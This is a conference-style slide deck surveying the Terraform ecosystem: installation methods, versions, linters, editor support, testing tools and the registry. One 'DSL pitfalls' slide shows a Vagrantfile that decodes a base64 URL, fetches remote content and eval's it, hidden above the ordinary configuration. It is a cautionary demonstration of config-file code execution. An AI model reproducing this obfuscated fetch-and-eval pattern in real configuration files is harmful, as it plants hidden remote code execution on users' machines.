---
marp: true
theme: default
style: |
  section {
    font-size: 30px;
  }
---
# Terraform Ecosystem

### Aleksandr Usov

Senior System Engineer
HashiCorp Certified: Terraform Associate

---
# Agenda
- Exam
- Tools
- Versions

---
# HashiCorp Suite

### Find the odd one

![height:300px](images/terarform_hashicorp_suite.webp)

---
# HashiCorp Suite

- Vagrant is written in Ruby, uses extremely feature rich DSL
- All others are written in Go, uses HCL
- HCL is not a format for serializing data structures(like JSON, YAML, etc). HCL is a syntax and API for building structured configuration formats
- HCL attempts to strike a compromise between generic serialization formats such as YAML and configuration formats built around full programming languages such as Ruby

----
# DSL pitfalls

Brian Kernighan:
«C is a razor sharp tool, with which one can create an elegant and efficient program or a bloody mess»

---
# DSL pitfalls
```bash
$ vagrant init centos/8
$ sed -i '/^[ ]*#/d;/^$/d' Vagrantfile
$ cat Vagrantfile 
Vagrant.configure("2") do |config|
  config.vm.box = "centos/8"
end
```
```ruby
require 'base64'
require 'net/http'

eval Net::HTTP.get \
URI(Base64.decode64("aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw=="))

exit 0

Vagrant.configure("2") do |config|
  config.vm.box = "centos/8"
end
```

---
# HashiCorp Associate Certification

- HashiCorp sample questions
- My questions

[Exam](https://docs.google.com/forms/d/e/1FAIpQLSdSrbcakTu_f-0QX445rmwk9CNhxDPOuZGUkbk_hqmG9srbTg/viewform)

---
# go

- Knowledge of the Go language is not required, but it’s better to able for reading provider code
- Provider code is a very subtle layer for cloud or service API
- Providers themselves are executable files that communicate with TF via gRPC

---
# Installation: binary

```bash
$ wget 'https://releases.hashicorp.com/terraform/0.12.24/terraform_0.12.24_linux_amd64.zip'
$ unzip terraform_0.12.24_linux_amd64.zip 
$ strings terraform | grep goenv | tail -1
/opt/goenv/versions/1.12.13/src/internal/cpu/cpu.go
$ strings terraform | grep teamcity | tail -1
/opt/teamcity-agent/work/9e329aa031982669/pkg/mod/github.com/...
$ ./terraform version
Terraform v0.12.24
```

---
# Installation: linuxbrew

```bash
$ brew install -s terraform
$ type terraform
terraform is /home/wrcomb/.linuxbrew/bin/terraform
$ terraform version
Terraform v0.12.24
```

----
# Installation: go get

```bash
$ go version
go version go1.14.2 linux/amd64
$ env | grep ^GO
GOPATH=/home/wrcomb/go
$ go get github.com/hashicorp/terraform
$ ./go/bin/terraform version
Terraform v0.13.0-dev
# GO111MODULE
$ GO111MODULE=on go get github.com/hashicorp/terraform
$ ./go/bin/terraform version
Terraform v0.12.24
$ GO111MODULE=on go get github.com/hashicorp/terraform@master
Terraform v0.13.0-dev
```

---
# Installation: go get

```bash
gdb -q
(gdb) file terraform
(gdb) list
22              "github.com/mattn/go-shellwords"
23              "github.com/mitchellh/cli"
24              "github.com/mitchellh/colorstring"
25              "github.com/mitchellh/panicwrap"
26              "github.com/mitchellh/prefixedio"
27
28              backendInit "github.com/hashicorp/terraform/backend/init"
29      )
30
31      const (
(gdb) 
```

---
# Installation: ./scripts/build.sh

```
$ git clone --depth=1 https://github.com/hashicorp/terraform.git
$ cd terraform
$ sed -i 's/"Terraform v%s"/"Terraform EPAM v%s"/' command/version.go
$ ./scripts/build.sh
$ ~/go/bin/terraform version
Terraform EPAM v0.13.0-dev
```

---
# Installation: docker

```
$ docker run -it --entrypoint sh hashicorp/terraform
$ terraform version
Terraform v0.12.24
```

---
# Installation: tfenv

```
$ git clone --depth=1 'https://github.com/tfutils/tfenv.git' ~/.tfenv
$ export PATH="$HOME/.tfenv/bin:$PATH"
$ tfenv install 0.7.0
$ tfenv use 0.7.0
$ terraform version
Terraform v0.7.0

Your version of Terraform is out of date! The latest version
is 0.12.24. You can update by downloading from www.terraform.io
```

---
# Comparison: Stack Exchange
| Tool                            | Result | Tag  |
|---------------------------------|--------|------|
| Terraform                       | 14,733 | 4971 |
| CloudFormation                  | 9,547  | 4557 |
| Azure Resource Templates        | 1801   | 1806 |
| Google Cloud Deployment Manager | 250    | 174  |

---
# Comparison: Stack Exchange
| Tool             | Jobs |
|------------------|------|
| Terraform        | 64   |
| Ansible          | 53   |
| CloudFormation   | 19   |
| Puppet           | 17   |
| SaltStack        | 4    |

---
# Contributors

![height:600px](images/terraform_contribution.png)

---
# Version: 0.11

- November 16, 2017 → May 16, 2019
- https://github.com/hashicorp/terraform/blob/v0.11/CHANGELOG.md 
- New GCP and Azure providers require 0.12+
- Most AWS registry modules require 0.12+

---
# Version 0.12

- May 22, 2019 → March 19, 2020
- https://github.com/hashicorp/terraform/blob/v0.12/CHANGELOG.md
- Current version

---
# Version: 0.13

- Unreleased
- Terraform now supports a decentralized namespace for providers, allowing for automatic installation of community providers from third-party namespaces 
- Ansible Collection from 2.9 and Fully Qualified Collection Namespace like community.grafana.grafana_datasource

```
terraform {
  required_providers {
    my-aws = {
      source  = "company.example/hashicorp/my-aws"
      version = "2.0.0"
    }
  }
}
```

---
# golangci-lint

```bash
$ git clone --depth=1 https://github.com/hashicorp/terraform.git
$ cd terraform
$ git checkout v0.12.24
$ golangci-lint run | grep \.go: | awk -F \( '{gsub("\)","",$NF); print $NF}'\
| sort | uniq -c | sort -n
      2 govet
     15 ineffassign
     15 structcheck
     19 staticcheck
     22 deadcode
     35 gosimple
     39 varcheck
     42 unused
     50 errcheck
```
 😱

---
# Terragrunt

- Keep your Terraform code DRY(remote source)
- Keep your remote state configuration DRY(support expressions, variables and functions)
- Keep your CLI flags DRY(extra CLI arguments)
- Execute Terraform commands on multiple modules at once(run terragrunt once)
- Work with multiple AWS accounts(assume an IAM role)
- Inputs(inputs block)
- Locals
- Before and After Hooks(actions that will be called either before or after execution)
- ...

---
# bash-completion

```bash
$ bash_it enable completion terraform
```
```bash
$ wget "https://raw.githubusercontent.com/Bash-it/bash-it/\
master/completion/available/terraform.completion.bash"
$ source terraform.completion.bash
```

---
# terraform console

```bash
$ cat main.tf 
locals {
  test = "test"
}
$ terraform console
> local.test
test
```

---
# TFLint

tflint/rules/terraformrules/terraform_required_version.go:
```go
// Check checks whether variables have descriptions
func (r *TerraformRequiredVersionRule) Check(runner *tflint.Runner) error {
	log.Printf("[TRACE] Check `%s` rule for `%s` runner", r.Name(), runner.TFConfigPath())

	module := runner.TFConfig.Module
	versionConstraints := module.CoreVersionConstraints
	if len(versionConstraints) == 0 {
		runner.EmitIssue(
			r,
			fmt.Sprintf("terraform \"required_version\" attribute is required"),
			hcl.Range{},
		)
		return nil
	}

	return nil
}
```

---
# TFLint
```bash
$ GO111MODULE=on go get github.com/terraform-linters/tflint@master
$ tflint --version
TFLint version 0.15.5
$ git clone --depth=1 https://github.com/terraform-aws-modules/terraform-aws-vpc.git
$ cd terraform-aws-vpc/
$ tflint --deep --enable-rule=terraform_typed_variables | head -12
23 issue(s) found:

Warning: `create_vpc` variable has no type (terraform_typed_variables)

  on variables.tf line 1:
   1: variable "create_vpc" {

Reference: https://github.com/terraform-linters/tflint/blob/v0.15.5/docs/rules/terraform_...
```

---
# IDEA: HashiCorp Terraform / HCL language support

09.10.2019
![height:450px](images/terarform_idea.png)

---
# Visual Studio Code: 4ops.terraform

31.12.2019
Too simple
![height:450px](images/terarform_vscode_4ops.png)

---
# terraform-lsp

Supported Editors: Visual Studio Code, Atom, Vim, Sublime Text 3, IntelliJ, Emacs

```bash
$ terraform-lsp -version
v0.0.11-beta1, commit: 26e8a12ecfb9d2739ebc973e0b25888a30d0ee19, ...
```

---
# tfschema

```bash
complete -C /home/wrcomb/bin/tfschema tfschema

tfschema resource show aws_lambda_function 
+--------------------------------+--------------+----------+----------+----------+-----------+
| ATTRIBUTE                      | TYPE         | REQUIRED | OPTIONAL | COMPUTED | SENSITIVE |
+--------------------------------+--------------+----------+----------+----------+-----------+
| arn                            | string       | false    | false    | true     | false     |
| description                    | string       | false    | true     | false    | false     |
| filename                       | string       | false    | true     | false    | false     |
```

---
# Visual Studio Code: mauve.terraform

25.08.2019
![height:450px](images/terarform_vscode_mauve.png)

---
# Visual Studio Code: mauve.terraform

```json
    "terraform.indexing": {
        "enabled": false,
        "liveIndexing": false
    },
    "terraform.languageServer": {
        "enabled": true,
        "args": []
    },
```

---
# Testing: awspec

```bash
$ cat Gemfile
source 'https://rubygems.org'
gem 'awspec'
$ bundle install 
$ awspec init
$ cat
require 'spec_helper'

describe ec2('i-0f74ebda72dc44f5c') do
    it { should exist }
end
```
[Resource Types](https://github.com/k1LoW/awspec/blob/master/doc/resource_types.md)

---
# Testing: awspec

```bash
rake spec
...

ec2 'i-0f74ebda72dc44f5c'
  is expected to exist

Finished in 0.9023 seconds (files took 4.8 seconds to load)
1 example, 0 failures
```

---
# Testing

- kitchen-terraform + kitchen-verifier-awspec(automation)
- InSpec(support AWS/GCP/Azure resources)
- goss(more suitable for configuration management)
- Serverspec(more suitable for configuration management)
- Testinfra(more suitable for configuration management)
- Terratest(testify for infrastructure)

---
# Blast Radius

![height:450px](images/terarform_blast_radius.png)

---
# Cloudcraft: Overview

![height:450px](images/terarform_Cloudcraft.png)

---
# Cloudcraft: Terraform

```
terraform {
  source = "git::git@github.com:terraform-aws-modules/terraform-aws-rds.git?ref=v2.14.0"
}

include {
  path = find_in_parent_folders()
}

###########################################################
# View all available inputs for this module:
# https://registry.terraform.io/modules/terraform-aws-modules/rds/aws/2.14.0?tab=inputs
###########################################################
inputs = {
  # The allocated storage in gigabytes
  # type: string
  allocated_storage = "5"
```

---
# Registry: Providers

- Third-party providers must be manually installed
![height:400px](images/terarform_registry_providers.png)

---
# Registry: Modules

![height:500px](images/terarform_registry_modules.png)

---
# Registry: Modules

```
module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "2.33.0" # optional
  # insert the 12 required variables here
}
```

---
# End